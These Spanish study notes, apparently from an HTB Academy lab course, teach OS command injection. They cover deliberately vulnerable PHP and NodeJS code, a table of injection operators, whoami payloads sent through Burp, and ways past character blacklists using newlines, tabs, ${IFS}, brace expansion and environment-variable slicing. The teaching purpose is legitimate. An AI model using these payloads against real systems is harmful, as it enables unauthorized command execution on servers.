---
tags:
  - HTB-Academy
  - Penetration-Tester
---

# Introducción a las Inyecciones de Comando

---

Una vulnerabilidad de inyección de comandos se encuentra entre los tipos de vulnerabilidades más críticos. Nos permite ejecutar comandos del sistema directamente en el servidor de alojamiento de back-end, lo que podría llevar a comprometer toda la red. Si una aplicación web utiliza una entrada controlada por el usuario para ejecutar un comando del sistema en el servidor de back-end para recuperar y devolver una salida específica, es posible que podamos inyectar una carga útil maliciosa para subvertir el comando deseado y ejecutar nuestros comandos.

---

## Qué son las inyecciones

Las vulnerabilidades de inyección se consideran el riesgo número 3 en [Los 10 principales riesgos de la Aplicación Web de OWASP](https://owasp.org/www-project-top-ten/), dado su alto impacto y lo comunes que son. La inyección ocurre cuando la entrada controlada por el usuario se malinterpreta como parte de la consulta web o el código que se está ejecutando, lo que puede llevar a subvertir el resultado previsto de la consulta a un resultado diferente que sea útil para el atacante.

Hay muchos tipos de inyecciones que se encuentran en las aplicaciones web, dependiendo del tipo de consulta web que se está ejecutando. Los siguientes son algunos de los tipos más comunes de inyecciones:

|Inyección|Descripción|
|---|---|
|Inyección de Comando OS|Ocurre cuando la entrada del usuario se utiliza directamente como parte de un comando OS.|
|Inyección de Código|Ocurre cuando la entrada del usuario está directamente dentro de una función que evalúa el código.|
|Inyecciones SQL|Ocurre cuando la entrada del usuario se utiliza directamente como parte de una consulta SQL.|
|Cross-Site Scripting/HTML Inyección|Ocurre cuando la entrada exacta del usuario se muestra en una página web.|

Hay muchos otros tipos de inyecciones que no sean las anteriores, como `LDAP injection`, `NoSQL Injection`, `HTTP Header Injection`, `XPath Injection`, `IMAP Injection`, `ORM Injection`, y otros. Cada vez que la entrada del usuario se utiliza dentro de una consulta sin ser desinfectada adecuadamente, puede ser posible escapar de los límites de la cadena de entrada del usuario a la consulta principal y manipularla para cambiar su propósito previsto. Esta es la razón por la cual a medida que se introduzcan más tecnologías web en las aplicaciones web, veremos nuevos tipos de inyecciones introducidas en las aplicaciones web.

---

## Inyecciones de Comando OS

Cuando se trata de Inyecciones de Comando OS, la entrada de usuario que controlamos debe ir directa o indirectamente a (o afectar de alguna manera) una consulta web que ejecuta comandos del sistema. Todos los lenguajes de programación web tienen diferentes funciones que permiten al desarrollador ejecutar comandos del sistema operativo directamente en el servidor back-end cuando lo necesite. Esto se puede usar para varios propósitos, como instalar complementos o ejecutar ciertas aplicaciones.

#### Ejemplo PHP

Por ejemplo, una aplicación web escrita en `PHP` puede usar el `exec`, `system`, `shell_exec`, `passthru`, o `popen` funciones para ejecutar comandos directamente en el servidor de back-end, cada una con un caso de uso ligeramente diferente. El siguiente código es un ejemplo de código PHP que es vulnerable a las inyecciones de comandos:

Código: php

```php
<?php
if (isset($_GET['filename'])) {
    system("touch /tmp/" . $_GET['filename'] . ".pdf");
}
?>
```

Tal vez una aplicación web en particular tiene una funcionalidad que permite a los usuarios crear una nueva `.pdf` documento que se crea en el `/tmp` directorio con un nombre de archivo suministrado por el usuario y luego puede ser utilizado por la aplicación web para fines de procesamiento de documentos. Sin embargo, como la entrada del usuario desde el `filename` parámetro en el `GET` la solicitud se utiliza directamente con el `touch` comando (sin ser desinfectado o escapado primero), la aplicación web se vuelve vulnerable a la inyección de comandos OS. Esta falla se puede explotar para ejecutar comandos arbitrarios del sistema en el servidor de back-end.

#### Ejemplo de NodeJS

Esto no es exclusivo de `PHP` solo, pero puede ocurrir en cualquier marco de desarrollo web o lenguaje. Por ejemplo, si se desarrolla una aplicación web en `NodeJS`, un desarrollador puede usar `child_process.exec` o `child_process.spawn` para el mismo propósito. El siguiente ejemplo realiza una funcionalidad similar a lo que discutimos anteriormente:

Código: javascript

```javascript
app.get("/createfile", function(req, res){
    child_process.exec(`touch /tmp/${req.query.filename}.txt`);
})
```

El código anterior también es vulnerable a una vulnerabilidad de inyección de comandos, ya que utiliza el `filename` parámetro de la `GET` solicite como parte del comando sin desinfectarlo primero. Ambos `PHP` y `NodeJS` las aplicaciones web se pueden explotar utilizando los mismos métodos de inyección de comandos.

Del mismo modo, otros lenguajes de programación de desarrollo web tienen funciones similares utilizadas para los mismos fines y, si son vulnerables, pueden explotarse utilizando los mismos métodos de inyección de comandos. Además, las vulnerabilidades de Inyección de comandos no son exclusivas de las aplicaciones web, sino que también pueden afectar a otros binarios y clientes gruesos si pasan la entrada de usuario no analizada a una función que ejecuta comandos del sistema, que también se puede explotar con los mismos métodos de inyección de comandos.

La siguiente sección discutirá diferentes métodos para detectar y explotar vulnerabilidades de inyección de comandos en aplicaciones web.


# Detección

---

El proceso de detección de vulnerabilidades básicas de Inyección de Comando OS es el mismo proceso para explotar tales vulnerabilidades. Intentamos agregar nuestro comando a través de varios métodos de inyección. Si la salida del comando cambia del resultado habitual previsto, hemos explotado con éxito la vulnerabilidad. Esto puede no ser cierto para vulnerabilidades de inyección de comandos más avanzadas porque podemos utilizar varios métodos de borrado o revisiones de código para identificar posibles vulnerabilidades de inyección de comandos. Luego podemos construir gradualmente nuestra carga útil hasta que logremos la inyección de comandos. Este módulo se centrará en las inyecciones de comandos básicos, donde controlamos la entrada del usuario que se está utilizando directamente en la ejecución de comandos del sistema de una función sin ningún tipo de desinfección.

Para demostrar esto, utilizaremos el ejercicio que se encuentra al final de esta sección.

---

## Detección de Inyección de Comando

Cuando visitamos la aplicación web en el siguiente ejercicio, vemos un `Host Checker` utilidad que parece pedirnos una IP para comprobar si está viva o no: ![Imagen de una interfaz de Host Checker con un campo de texto etiquetado como 'Introducir una dirección IP' que contiene '127.0.0.1' y un botón 'Verificar' a continuación.](https://academy.hackthebox.com/storage/modules/109/cmdinj_basic_exercise_1.jpg)

Podemos intentar ingresar la IP localhost `127.0.0.1` para comprobar la funcionalidad, y como se esperaba, devuelve la salida de la `ping` comando diciéndonos que el localhost está realmente vivo: ![Interfaz Host Checker con un campo de texto para ingresar una dirección IP, '127.0.0.1' ingresado, un botón 'Verificar' y los resultados de ping que se muestran a continuación.](https://academy.hackthebox.com/storage/modules/109/cmdinj_basic_exercise_2.jpg)

Aunque no tenemos acceso al código fuente de la aplicación web, podemos adivinar con confianza que la IP que ingresamos está entrando en un `ping` comando ya que la salida que recibimos sugiere que. Como el resultado muestra un solo paquete transmitido en el comando ping, el comando utilizado puede ser el siguiente:

Código: bash

```bash
ping -c 1 OUR_INPUT
```

Si nuestra entrada no se desinfecta y se escapa antes de que se use con el `ping` comando, podemos inyectar otro comando arbitrario. Por lo tanto, intentemos ver si la aplicación web es vulnerable a la inyección de comandos del SO.

---

## Métodos de Inyección de Comando

Para inyectar un comando adicional al previsto, podemos utilizar cualquiera de los siguientes operadores:

|**Operador de Inyección**|**Carácter de Inyección**|**Carácter codificado por URL**|**Comando Ejecutado**|
|---|---|---|---|
|Semicolon|`;`|`%3b`|Ambos|
|Nueva Línea|`\n`|`%0a`|Ambos|
|Antecedentes|`&`|`%26`|Ambos (segunda salida generalmente mostrada primero)|
|Tubo|`\|`|`%7c`|Ambos (solo se muestra la segunda salida)|
|Y|`&&`|`%26%26`|Ambos (solo si primero tiene éxito)|
|O|`\|`|`%7c%7c`|Segundo (solo si falla primero)|
|Sub-Shell|` `` `|`%60%60`|Ambos (Linux-only)|
|Sub-Shell|`$()`|`%24%28%29`|Ambos (Linux-only)|

Podemos usar cualquiera de estos operadores para inyectar otro comando para `both` o `either` de los comandos se ejecutan. `We would write our expected input (e.g., an IP), then use any of the above operators, and then write our new command.`

Consejo: Además de lo anterior, hay algunos operadores de solo unix, que funcionarían en Linux y macOS, pero no funcionarían en Windows, como envolver nuestro comando inyectado con doble backticks (` `` `) o con un operador de sub-carcasa (`$()`).

En general, para la inyección de comandos básicos, todos estos operadores se pueden usar para inyecciones de comandos `regardless of the web application language, framework, or back-end server`. Entonces, si estamos inyectando en un `PHP` aplicación web que se ejecuta en un `Linux` servidor, o un `.Net` aplicación web que se ejecuta en un `Windows` servidor de back-end, o un `NodeJS` aplicación web que se ejecuta en un `macOS` servidor de back-end, nuestras inyecciones deberían funcionar independientemente.

Nota: La única excepción puede ser el punto y coma `;`, que no funcionará si el comando se estaba ejecutando con `Windows Command Line (CMD)`, pero seguiría funcionando si se estuviera ejecutando con `Windows PowerShell`.

En la siguiente sección, intentaremos utilizar uno de los operadores de inyección anteriores para explotar el `Host Checker` ejercicio.


# Inyección de Comandos

---

Hasta ahora, hemos encontrado el `Host Checker` la aplicación web es potencialmente vulnerable a las inyecciones de comandos y discutió varios métodos de inyección que podemos utilizar para explotar la aplicación web. Entonces, comencemos nuestros intentos de inyección de comandos con el operador semi-colon (`;`).

---

## Inyectando Nuestro Comando

Podemos agregar un punto y coma después de nuestra IP de entrada `127.0.0.1`, y luego añadir nuestro comando (por ejemplo. `whoami`), de modo que la carga útil final que usaremos sea (`127.0.0.1; whoami`), y el comando final a ejecutar sería:

Código: bash

```bash
ping -c 1 127.0.0.1; whoami
```

Primero, intentemos ejecutar el comando anterior en nuestra VM de Linux para asegurarnos de que se ejecute:

  Inyección de Comandos

```shell-session
21y4d@htb[/htb]$ ping -c 1 127.0.0.1; whoami

PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=1.03 ms

--- 127.0.0.1 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 1.034/1.034/1.034/0.000 ms
21y4d
```

Como podemos ver, el comando final se ejecuta con éxito, y obtenemos la salida de ambos comandos (como se mencionó en la tabla anterior para `;`). Ahora, podemos intentar usar nuestra carga útil anterior en el `Host Checker` aplicación web: ![Interfaz Host Checker con un campo de texto para ingresar una dirección IP, que muestra '127.0.0.1; whoami' ingresado, un botón 'Comprobar' y una información sobre herramientas que dice 'Combinar el formato solicitado'.](https://academy.hackthebox.com/storage/modules/109/cmdinj_basic_injection.jpg)

Como podemos ver, la aplicación web rechazó nuestra entrada, ya que parece que solo acepta la entrada en un formato IP. Sin embargo, a partir del aspecto del mensaje de error, parece originarse desde el front-end en lugar del back-end. Podemos verificar esto con el `Firefox Developer Tools` haciendo clic `[CTRL + SHIFT + E]` para mostrar la pestaña Red y luego hacer clic en el `Check` botón de nuevo:

![Interfaz de herramientas de desarrollador que muestra la pestaña Red. Instrucciones: Realice una solicitud o haga clic en 'Cargar' para obtener detalles de la actividad de la red. Haga clic en el icono del cronómetro para el análisis del rendimiento. No se muestran solicitudes.](https://academy.hackthebox.com/storage/modules/109/cmdinj_basic_injection_network.jpg)

Como podemos ver, no se hicieron nuevas solicitudes de red cuando hicimos clic en el `Check` botón, sin embargo, recibimos un mensaje de error. Esto indica que el `user input validation is happening on the front-end`.

Esto parece ser un intento de evitar que enviemos cargas útiles maliciosas al permitir solo la entrada del usuario en un formato IP. `However, it is very common for developers only to perform input validation on the front-end while not validating or sanitizing the input on the back-end.` Esto ocurre por varias razones, como tener dos equipos diferentes trabajando en el front-end/back-end o confiando en la validación del front-end para evitar cargas útiles maliciosas.

Sin embargo, como veremos, las validaciones front-end generalmente no son suficientes para evitar inyecciones, ya que se pueden omitir fácilmente enviando solicitudes HTTP personalizadas directamente al back-end.

---

## Evitando la Validación Frontal

El método más fácil de personalizar las solicitudes HTTP que se envían al servidor back-end es usar un proxy web que pueda interceptar las solicitudes HTTP que envía la aplicación. Para hacerlo, podemos empezar `Burp Suite` o `ZAP` y configure Firefox para proxy el tráfico a través de ellos. Luego, podemos habilitar la función de intercepción de proxy, enviar una solicitud estándar desde la aplicación web con cualquier IP (por ejemplo. `127.0.0.1`), y enviar la solicitud HTTP interceptada a `repeater` haciendo clic `[CTRL + R]`, y deberíamos tener la solicitud HTTP para la personalización:

#### Solicitud de Burp POST

![detalles de solicitud HTTP en formato sin procesar, que muestran encabezados como Host, User-Agent y Content-Type, con IP establecida en 127.0.0.1.](https://academy.hackthebox.com/storage/modules/109/cmdinj_basic_repeater_1.jpg)

Ahora podemos personalizar nuestra solicitud HTTP y enviarla para ver cómo la aplicación web la maneja. Comenzaremos usando la misma carga útil anterior (`127.0.0.1; whoami`). También debemos codificar la URL de nuestra carga útil para asegurarnos de que se envíe según lo pretendemos. Podemos hacerlo seleccionando la carga útil y luego haciendo clic `[CTRL + U]`. Finalmente, podemos hacer clic `Send` para enviar nuestra solicitud HTTP:

#### Solicitud de Burp POST

![Interfaz que muestra una solicitud y respuesta HTTP. La solicitud incluye encabezados como Host y User-Agent, con IP '127.0.0.1; whoami'. La respuesta muestra HTML con un resultado de ping para 127.0.0.1.](https://academy.hackthebox.com/storage/modules/109/cmdinj_basic_repeater_2.jpg)

Como podemos ver, la respuesta que obtuvimos esta vez contiene la salida de la `ping` comando y el resultado de la `whoami` comando, `meaning that we successfully injected our new command`.


# Otros Operadores de Inyección

---

Antes de seguir adelante, probemos algunos otros operadores de inyección y veamos qué tan diferente los manejaría la aplicación web.

---

## Y Operador

Podemos empezar con el `AND` (`&&`) operador, de modo que nuestra carga útil final sería (`127.0.0.1 && whoami`), y el comando final ejecutado sería el siguiente:

Código: bash

```bash
ping -c 1 127.0.0.1 && whoami
```

Como siempre deberíamos, intentemos ejecutar el comando en nuestra VM Linux primero para asegurarnos de que sea un comando funcional:

  Otros Operadores de Inyección

```shell-session
21y4d@htb[/htb]$ ping -c 1 127.0.0.1 && whoami

PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=1.03 ms

--- 127.0.0.1 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 1.034/1.034/1.034/0.000 ms
21y4d
```

Como podemos ver, el comando se ejecuta y obtenemos la misma salida que obtuvimos anteriormente. Intente consultar la tabla de operadores de inyección de la sección anterior y vea cómo `&&` el operador es diferente (si no escribimos una IP y comenzamos directamente con `&&`, ¿el comando seguiría funcionando?).

Ahora, podemos hacer lo mismo que hicimos antes copiando nuestra carga útil, pegándola en nuestra solicitud HTTP en `Burp Suite`, URL que lo codifica, y luego finalmente enviarlo: ![Interfaz que muestra una solicitud y respuesta HTTP. La solicitud incluye encabezados como Host y User-Agent, con IP '127.0.0.1+%26%26+whoami'. La respuesta muestra HTML con un resultado de ping para 127.0.0.1.](https://academy.hackthebox.com/storage/modules/109/cmdinj_basic_AND.jpg)

Como podemos ver, inyectamos con éxito nuestro comando y recibimos la salida esperada de ambos comandos.

---

## O Operador

Finalmente, probemos el `OR` (`||`) operador de inyección. El `OR` el operador solo ejecuta el segundo comando si el primer comando no se ejecuta. Esto puede ser útil para nosotros en los casos en que nuestra inyección rompería el comando original sin tener una forma sólida de que ambos comandos funcionen. Entonces, usando el `OR` el operador haría que nuestro nuevo comando se ejecute si falla el primero.

Si intentamos usar nuestra carga útil habitual con el `||` operador (`127.0.0.1 || whoami`), veremos que solo se ejecutaría el primer comando:

  Otros Operadores de Inyección

```shell-session
21y4d@htb[/htb]$ ping -c 1 127.0.0.1 || whoami

PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.635 ms

--- 127.0.0.1 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.635/0.635/0.635/0.000 ms
```

Esto es por cómo `bash` los comandos funcionan. Como el primer comando devuelve el código de salida `0` indicando ejecución exitosa, el `bash` el comando se detiene y no prueba el otro comando. Solo intentaría ejecutar el otro comando si el primer comando fallaba y devolvía un código de salida `1`.

`Try using the above payload in the HTTP request, and see how the web application handles it.`

Intentemos romper intencionalmente el primer comando al no suministrar una IP y usar directamente el `||` operador (`|| whoami`), de modo que el `ping` el comando fallaría y nuestro comando inyectado se ejecuta:

  Otros Operadores de Inyección

```shell-session
21y4d@htb[/htb]$ ping -c 1 || whoami

ping: usage error: Destination address required
21y4d
```

Como podemos ver, esta vez, el `whoami` el comando se ejecutó después del `ping` el comando falló y nos dio un mensaje de error. Entonces, probemos ahora el (`|| whoami`) carga útil en nuestra solicitud HTTP: ![Interfaz que muestra una solicitud y respuesta HTTP. La solicitud incluye encabezados como Host y User-Agent, con IP configurada en '|+whoami'. La respuesta muestra HTML con un formulario para ingresar una dirección IP y un botón 'Verificar'.](https://academy.hackthebox.com/storage/modules/109/cmdinj_basic_OR.jpg)

Vemos que esta vez solo obtuvimos la salida del segundo comando como se esperaba. Con esto, estamos utilizando una carga útil mucho más simple y obteniendo un resultado mucho más limpio.

Dichos operadores se pueden usar para varios tipos de inyección, como inyecciones SQL, inyecciones LDAP, XSS, SSRF, XML, etc. Hemos creado una lista de los operadores más comunes que se pueden utilizar para inyecciones:

|**Tipo de Inyección**|**Operadores**|
|---|---|
|Inyección SQL|`'` `,` `;` `--` `/* */`|
|Inyección de Comando|`;` `&&`|
|LDAP Inyección|`*` `(` `)` `&` `\|`|
|XPath Inyección|`'` `or` `and` `not` `substring` `concat` `count`|
|Inyección de Comando OS|`;` `&` `\|`|
|Inyección de Código|`'` `;` `--` `/* */` `$()` `${}` `#{}` `%{}` `^`|
|Directorio Traversal/File Path Traversal|`../` `..\\` `%00`|
|Inyección de Objetos|`;` `&` `\|`|
|XQuery Inyección|`'` `;` `--` `/* */`|
|Shellcode Inyección|`\x` `\u` `%u` `%n`|
|Inyección de Cabezal|`\n` `\r\n` `\t` `%0d` `%0a` `%09`|

Tenga en cuenta que esta tabla está incompleta, y muchas otras opciones y operadores son posibles. También depende en gran medida del entorno con el que estamos trabajando y probando.

En este módulo, estamos tratando principalmente con inyecciones de comandos directos, en los que nuestra entrada va directamente al comando del sistema, y estamos recibiendo la salida del comando. Para obtener más información sobre las inyecciones de comando avanzadas, como las inyecciones indirectas o la inyección ciega, puede consultar el [Whitebox Pentesting 101: Inyección de Comando](https://academy.hackthebox.com/course/preview/whitebox-pentesting-101-command-injection) módulo, que cubre métodos avanzados de inyecciones y muchos otros temas.

# Conéctese a Pwnbox

Su propia instancia Parrot Linux basada en la web para jugar en nuestros laboratorios.



# Identificación de Filtros

---

Como hemos visto en la sección anterior, incluso si los desarrolladores intentan proteger la aplicación web contra inyecciones, aún puede ser explotable si no se codificó de forma segura. Otro tipo de mitigación de inyección es utilizar caracteres y palabras en la lista negra en el back-end para detectar intentos de inyección y denegar la solicitud si alguna solicitud los contenía. Otra capa además de esto es utilizar Web Application Firewalls (WAFs), que pueden tener un alcance más amplio y varios métodos de detección de inyección y prevenir varios otros ataques como inyecciones SQL o ataques XSS.

Esta sección analizará algunos ejemplos de cómo se pueden detectar y bloquear las inyecciones de comandos y cómo podemos identificar qué se está bloqueando.

---

## Filtro/Detección de WAF

Comencemos visitando la aplicación web en el ejercicio al final de esta sección. Vemos lo mismo `Host Checker` aplicación web que hemos estado explotando, pero ahora tiene algunas mitigaciones bajo la manga. Podemos ver que si probamos los operadores anteriores probamos, como (`;`, `&&`, `||`), recibimos el mensaje de error `invalid input`: ![Interfaz que muestra una solicitud y respuesta HTTP. La solicitud incluye encabezados como Host y User-Agent, con IP establecida en '127.0.0.1+%3b+whoami'. La respuesta muestra un formulario Host Checker con '127.0.0.1' ingresado y un mensaje 'Introducción no válida'.](https://academy.hackthebox.com/storage/modules/109/cmdinj_filters_1.jpg)

Esto indica que algo que enviamos activó un mecanismo de seguridad que negó nuestra solicitud. Este mensaje de error se puede mostrar de varias maneras. En este caso, lo vemos en el campo donde se muestra la salida, lo que significa que fue detectado y prevenido por el `PHP` aplicación web en sí. `If the error message displayed a different page, with information like our IP and our request, this may indicate that it was denied by a WAF`.

Verifiquemos la carga útil que enviamos:

Código: bash

```bash
127.0.0.1; whoami
```

Aparte de la IP (que sabemos que no está en la lista negra), enviamos:

1. Un personaje semi-colon `;`
2. Un personaje espacial
3. A `whoami` comando

Entonces, la aplicación web tampoco `detected a blacklisted character` o `detected a blacklisted command`, o ambos. Entonces, veamos cómo evitar cada uno.

---

## Personajes en la lista negra

Una aplicación web puede tener una lista de caracteres en la lista negra, y si el comando los contiene, denegaría la solicitud. El `PHP` el código puede parecerse a lo siguiente:

Código: php

```php
$blacklist = ['&', '|', ';', ...SNIP...];
foreach ($blacklist as $character) {
    if (strpos($_POST['ip'], $character) !== false) {
        echo "Invalid input";
    }
}
```

Si algún carácter en la cadena que enviamos coincide con un carácter en la lista negra, nuestra solicitud es denegada. Antes de comenzar nuestros intentos de omitir el filtro, debemos tratar de identificar qué carácter causó la solicitud denegada.

---

## Identificación del personaje de la Lista Negra

Reduzcamos nuestra solicitud a un personaje a la vez y veamos cuándo se bloquea. Sabemos que el (`127.0.0.1`) la carga útil funciona, así que comencemos agregando el punto y coma (`127.0.0.1;`): ![Interfaz que muestra una solicitud y respuesta HTTP. La solicitud incluye encabezados como Host y User-Agent, con IP establecida en '127.0.0.1%3b'. La respuesta muestra HTML para un formulario Host Checker con un mensaje de 'Introducción no válida'.](https://academy.hackthebox.com/storage/modules/109/cmdinj_filters_2.jpg)

Todavía tenemos un `invalid input`, error que significa que un punto y coma está en la lista negra. Entonces, veamos si todos los operadores de inyección que discutimos anteriormente están en la lista negra.


# Bypass Filtros Espaciales

---

Existen numerosas formas de detectar intentos de inyección, y existen múltiples métodos para evitar estas detecciones. Demostraremos el concepto de detección y cómo funciona el bypass usando Linux como ejemplo. Aprenderemos cómo utilizar estos bypass y eventualmente podremos prevenirlos. Una vez que tengamos una buena comprensión de cómo funcionan, podemos pasar por varias fuentes en Internet para descubrir otros tipos de bypass y aprender a mitigarlos.

---

## Bypass Operadores en la Lista Negra

Veremos que la mayoría de los operadores de inyección están en la lista negra. Sin embargo, el carácter de nueva línea generalmente no está en la lista negra, ya que puede ser necesario en la carga útil en sí. Sabemos que el carácter de nueva línea funciona añadiendo nuestros comandos tanto en Linux como en Windows, así que intentemos usarlo como nuestro operador de inyección: ![Interfaz que muestra una solicitud y respuesta HTTP. La solicitud incluye encabezados como Host y User-Agent, con IP establecida en '127.0.0.1%0a'. La respuesta muestra HTML para un formulario Host Checker y resultados de ping para 127.0.0.1.](https://academy.hackthebox.com/storage/modules/109/cmdinj_filters_operator.jpg)

Como podemos ver, a pesar de que nuestra carga útil incluyó un carácter de nueva línea, nuestra solicitud no fue denegada, y obtuvimos la salida del comando ping `which means that this character is not blacklisted, and we can use it as our injection operator`. Comencemos discutiendo cómo evitar un personaje comúnmente en la lista negra: un personaje espacial.

---

## Bypass Espacios en la Lista Negra

Ahora que tenemos un operador de inyección en funcionamiento, modifiquemos nuestra carga útil original y enviémosla nuevamente como (`127.0.0.1%0a whoami`): ![Interfaz que muestra una solicitud y respuesta HTTP. La solicitud incluye encabezados como Host y User-Agent, con IP establecida en '127.0.0.1%0a+whoami'. La respuesta muestra HTML para un formulario de Comprobador de host y un mensaje de 'Entrada no válida'.](https://academy.hackthebox.com/storage/modules/109/cmdinj_filters_spaces_1.jpg)

Como podemos ver, todavía tenemos un `invalid input` mensaje de error, lo que significa que todavía tenemos otros filtros para evitar. Entonces, como lo hicimos antes, solo agreguemos el siguiente carácter (que es un espacio) y veamos si causó la solicitud denegada: ![Interfaz que muestra una solicitud y respuesta HTTP. La solicitud incluye encabezados como Host y User-Agent, con IP establecida en '127.0.0.1%0a+whoami'. La respuesta muestra HTML para un formulario de Comprobador de host y un mensaje de 'Entrada no válida'.](https://academy.hackthebox.com/storage/modules/109/cmdinj_filters_spaces_2.jpg)

Como podemos ver, el personaje espacial también está en la lista negra. Un espacio es un carácter comúnmente en la lista negra, especialmente si la entrada no debe contener espacios, como una IP, por ejemplo. ¡Aún así, hay muchas maneras de agregar un personaje espacial sin usar realmente el personaje espacial!

#### Usando Pestañas

El uso de pestañas (%09) en lugar de espacios es una técnica que puede funcionar, ya que tanto Linux como Windows aceptan comandos con pestañas entre argumentos, y se ejecutan de la misma manera. Entonces, intentemos usar una pestaña en lugar del carácter de espacio (`127.0.0.1%0a%09`) y ver si nuestra solicitud es aceptada: ![Interfaz que muestra una solicitud y respuesta HTTP. La solicitud incluye encabezados como Host y User-Agent, con IP establecida en '127.0.0.1%0a%09'. La respuesta muestra HTML para un formulario Host Checker y resultados de ping para 127.0.0.1.](https://academy.hackthebox.com/storage/modules/109/cmdinj_filters_spaces_3.jpg)

Como podemos ver, omitimos con éxito el filtro de caracteres de espacio utilizando una pestaña. Veamos otro método para reemplazar caracteres espaciales.

#### Usando $IFS

El uso de la variable Linux Environment ($IFS) también puede funcionar, ya que su valor predeterminado es un espacio y una pestaña, que funcionaría entre argumentos de comando. Entonces, si usamos `${IFS}` donde deberían estar los espacios, la variable debería ser reemplazada automáticamente por un espacio, y nuestro comando debería funcionar.

Usemos `${IFS}` y ver si funciona (`127.0.0.1%0a${IFS}`): ![Interfaz que muestra una solicitud y respuesta HTTP. La solicitud incluye encabezados como Host y User-Agent, con IP establecida en '127.0.0.1%0a${IFS}'. La respuesta muestra HTML para un formulario Host Checker y resultados de ping para 127.0.0.1.](https://academy.hackthebox.com/storage/modules/109/cmdinj_filters_spaces_4.jpg)

Vemos que nuestra solicitud no fue denegada esta vez, y pasamos por alto el filtro espacial nuevamente.

#### Usando la Expansión de la Pulsera

Hay muchos otros métodos que podemos utilizar para evitar los filtros espaciales. Por ejemplo, podemos usar el `Bash Brace Expansion` característica, que agrega automáticamente espacios entre argumentos envueltos entre aparatos ortopédicos, de la siguiente manera:

  Bypass Filtros Espaciales

```shell-session
vcrdcr@htb[/htb]$ {ls,-la}

total 0
drwxr-xr-x 1 21y4d 21y4d   0 Jul 13 07:37 .
drwxr-xr-x 1 21y4d 21y4d   0 Jul 13 13:01 ..
```

Como podemos ver, el comando se ejecutó con éxito sin tener espacios. Podemos utilizar el mismo método en omisiones de filtro de inyección de comandos, mediante el uso de la expansión de la abrazadera en nuestros argumentos de comando, como (`127.0.0.1%0a{ls,-la}`). Para descubrir más derivaciones de filtro de espacio, consulte el [Cargas útilesAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#bypass-without-space) página sobre cómo escribir comandos sin espacios.

**Ejercicio:** Intente buscar otros métodos para evitar los filtros espaciales y úselos con el `Host Checker` aplicación web para aprender cómo funcionan.


# Bypassing Otros Personajes de la Lista Negra

---

Además de los operadores de inyección y los caracteres espaciales, un carácter muy comúnmente en la lista negra es la barra (`/`) o contragolpe (`\`) carácter, ya que es necesario especificar directorios en Linux o Windows. Podemos utilizar varias técnicas para producir cualquier carácter que queramos mientras evitamos el uso de caracteres en la lista negra.

---

## Linux

Hay muchas técnicas que podemos utilizar para tener cortes en nuestra carga útil. Una de esas técnicas que podemos usar para reemplazar barras (`or any other character`) es a través `Linux Environment Variables` como hicimos con `${IFS}`. Mientras `${IFS}` se reemplaza directamente con un espacio, no existe tal variable de entorno para barras o semicolones. Sin embargo, estos caracteres se pueden utilizar en una variable de entorno, y podemos especificar `start` y `length` de nuestra cuerda para que coincida exactamente con este personaje.

Por ejemplo, si miramos el `$PATH` variable de entorno en Linux, puede parecerse a lo siguiente:

  Bypassing Otros Personajes de la Lista Negra

```shell-session
vcrdcr@htb[/htb]$ echo ${PATH}

/usr/local/bin:/usr/bin:/bin:/usr/games
```

Entonces, si empezamos en el `0` carácter, y solo tomar una cadena de longitud `1`, terminaremos con solo el `/` carácter, que podemos utilizar en nuestra carga útil:

  Bypassing Otros Personajes de la Lista Negra

```shell-session
vcrdcr@htb[/htb]$ echo ${PATH:0:1}

/
```

**Nota:** Cuando usamos el comando anterior en nuestra carga útil, no agregaremos `echo`, ya que solo lo estamos usando en este caso para mostrar el carácter emitido.

Podemos hacer lo mismo con el `$HOME` o `$PWD` variables de entorno también. También podemos utilizar el mismo concepto para obtener un carácter semi-colon, para ser utilizado como un operador de inyección. Por ejemplo, el siguiente comando nos da un punto y coma:

  Bypassing Otros Personajes de la Lista Negra

```shell-session
vcrdcr@htb[/htb]$ echo ${LS_COLORS:10:1}

;
```

Ejercicio: Trate de entender cómo el comando anterior resultó en un punto y coma, y luego úselo en la carga útil para usarlo como operador de inyección. Sugerencia: El `printenv` el comando imprime todas las variables de entorno en Linux, por lo que puede ver cuáles pueden contener caracteres útiles y, a continuación, intentar reducir la cadena solo a ese carácter.

Entonces, intentemos usar variables de entorno para agregar un punto y coma y un espacio a nuestra carga útil (`127.0.0.1${LS_COLORS:10:1}${IFS}`) como nuestra carga útil, y ver si podemos evitar el filtro: ![Captura de pantalla de una interfaz de aplicación web que muestra una solicitud POST a la versión 127.0.0.1 con encabezados y una carga útil que contiene una posible inyección de comandos. La sección de respuesta muestra código HTML para un formulario 'Host Checker', lo que permite la entrada IP y muestra los resultados de ping para 127.0.0.1.](https://academy.hackthebox.com/storage/modules/109/cmdinj_filters_spaces_5.jpg)

Como podemos ver, esta vez también omitimos con éxito el filtro de caracteres.

---

## Windows

El mismo concepto funciona en Windows también. Por ejemplo, para producir una barra en `Windows Command Line (CMD)`, podemos `echo` una variable de Windows (`%HOMEPATH%` -> `\Users\htb-student`), y luego especifique una posición inicial (`~6` -> `\htb-student`), y finalmente especificando una posición final negativa, que en este caso es la longitud del nombre de usuario `htb-student` (`-11` -> `\`) :

  Bypassing Otros Personajes de la Lista Negra

```cmd-session
C:\htb> echo %HOMEPATH:~6,-11%

\
```

Podemos lograr lo mismo usando las mismas variables en `Windows PowerShell`. Con PowerShell, una palabra se considera una matriz, por lo que tenemos que especificar el índice del carácter que necesitamos. Como solo necesitamos un carácter, no tenemos que especificar las posiciones inicial y final:

  Bypassing Otros Personajes de la Lista Negra

```powershell-session
PS C:\htb> $env:HOMEPATH[0]

\


PS C:\htb> $env:PROGRAMFILES[10]
PS C:\htb>
```

También podemos usar el `Get-ChildItem Env:` Comando PowerShell para imprimir todas las variables de entorno y luego elegir una de ellas para producir un carácter que necesitamos. `Try to be creative and find different commands to produce similar characters.`

---

## Cambio de Personaje

